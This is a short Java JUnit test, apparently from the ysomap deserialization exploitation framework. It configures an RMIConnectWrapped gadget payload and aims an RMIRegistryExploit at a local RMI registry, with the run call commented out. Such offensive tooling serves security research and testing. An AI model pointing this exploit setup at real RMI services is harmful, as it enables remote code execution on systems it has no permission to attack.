package ysomap.core.exploit.rmi;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Exploit;
import ysomap.core.bean.Payload;
import ysomap.core.gadget.payload.rmi.RMIConnectWrapped;

/**
 * @author wh1t3P1g
 * @since 2020/3/10
 */
public class RMIRegistryExploitTest {

    @Test
    public void work() throws Exception {
        Payload payload = new RMIConnectWrapped();
        Bullet bullet = (Bullet) payload.getDefaultBullet("");
        bullet.set("rhost","127.0.0.1");
        bullet.set("rport","8888");
        payload.setBullet(bullet);
        Exploit exploit = new RMIRegistryExploit();
        exploit.set("target","127.0.0.1:2222");
        exploit.set("payload", payload.getObject());
//        exploit.run();
    }
}